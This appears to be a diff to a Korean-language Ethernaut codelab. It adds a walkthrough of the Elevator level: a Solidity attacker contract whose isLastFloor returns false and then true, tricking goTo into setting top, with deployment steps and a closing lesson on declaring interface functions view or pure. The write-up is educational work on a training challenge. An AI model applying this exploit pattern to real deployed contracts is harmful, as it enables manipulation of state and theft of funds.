@@ -162,9 +162,54 @@ modifier noReentrant() {
 <li><strong>Preservation</strong>: <code>delegatecall</code>을 통해 호출한 라이브러리의 스토리지 레이아웃 차이를 악용해 상태를 덮어썼습니다. 라이브러리 주소를 임의로 바꾸지 못하도록 고정하거나 업그레이드 시 접근 제어를 강화합니다.</li>
 </ul>
 <h2 is-upgraded>Elevator</h2>
-<ul>
-<li><strong>Elevator</strong>: 외부 컨트랙트에 의존한 로직이 반복 호출마다 다른 값을 반환하도록 설계돼 엘리베이터 층수 검증을 우회했습니다. 신뢰할 수 없는 컨트랙트와 통신할 때는 반환값을 검증하고 동일한 인터페이스를 강제해야 합니다.</li>
-</ul>
+<p><a href="https://ethernaut.openzeppelin.com/level/11" target="_blank">Elevator</a>은 빌딩의 꼭대기에 도달하는 문제입니다. 컨트랙트에 보면 top이라는 boll 타입의 변수가 있는데 이 값을 true로 바꾸면 됩니다.</p>
+<p>컨트랙트에서 goTo 함수를 호출하면 그 컨트랙트의 주소(<code>msg.sender</code>)를 Building 타입으로 보고 <code>isLastFloor()</code>를 호출한다. 우리는 Building interface와 동일한 컨트랙트를 통해 top을 true로 바꿀 것이다.</p>
+<p><code>isLastFloor</code>는 <code>goTo</code> 함수 내에서 두 번 호출된다. 처음은 조건 검사이고 두 번째는 top을 변경하기 위한 용도이다. 처음 <code>isLastFloor</code>가 호출되었을 때 false이고 그 다음 호출되기 전에 true라면 top은 true로 바뀔 수 있다. Build의 isLastFloor가 다음과 같이 동작하도록 구현하면 된다.</p>
+<pre><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.30;
+
+interface IElevator {
+    function goTo(uint _floor) external;
+}
+
+interface IBuilding {
+    function isLastFloor(uint) external returns (bool);
+}
+
+contract Building is IBuilding {
+    IElevator public target;
+    bool private toggle;
+
+    constructor(address _elevator) {
+        target = IElevator(_elevator);
+        toggle = false;
+    }
+
+    // Elevator가 두 번 호출하는 함수
+    function isLastFloor(uint) external override returns (bool) {
+        if (!toggle) {
+            toggle = true;
+            return false;
+        } else {
+            return true;
+        }
+    }
+
+    function attack(uint _floor) external {
+        target.goTo(_floor);
+    }
+}
+</code></pre>
+<p>먼저 Elvator 컨트랙트를 주소를 받아와 Building을 배포할 때 인자로 넘겨준다.</p>
+<p class="image-container"><img alt="Elevator Address" src="img/4e1f2eded75b21f.png"></p>
+<p class="image-container"><img alt="Elevator Deploy" src="img/9cc3ac380912070e.png"></p>
+<p>이후, Attack 함수를 호출해 공격한다. 이때 인자는 이동할 층으로, 아무 값이나 상관없다.</p>
+<p class="image-container"><img alt="Elevator Attack" src="img/4e1f2eded75b21f.png"></p>
+<p>정상적으로 top이 true로 변경했는지 확인한다. true이면 제출하면 된다.</p>
+<p class="image-container"><img alt="Elevator Solution" src="img/9cc3ac380912070e.png"></p>
+<p>이 문제는 <code>isLastFloor</code>라는 함수가 순수(pure)하게 동작하지 않았기 때문에 발생한 문제입니다. <code>isLastFloor</code>는 입력에 따라 마지막 층인지만 확인하고 그 결과를 반환해야 하는데 실제론 toggle이라는 상태를 가지고 상태에 따라 반환값이 달라지게 구현하였습니다. 즉, 실제로 pure하게 동작해야 하는데 외부 컨트랙트를 통해 그렇지 않게 동작하였습니다.</p>
+<p>이를 막기 위해 함수의 정의(interface)에서 어떤 역할을 하는지 명시적으로 알려줄 필요가 있고 상태를 변경하지 않는 함수라면 view나 pure를 사용해야 합니다.</p>
+<p class="image-container"><img alt="Elevator Tip" src="img/ff3488b2adfce8f8.png"></p>
 
 
       </google-codelab-step>
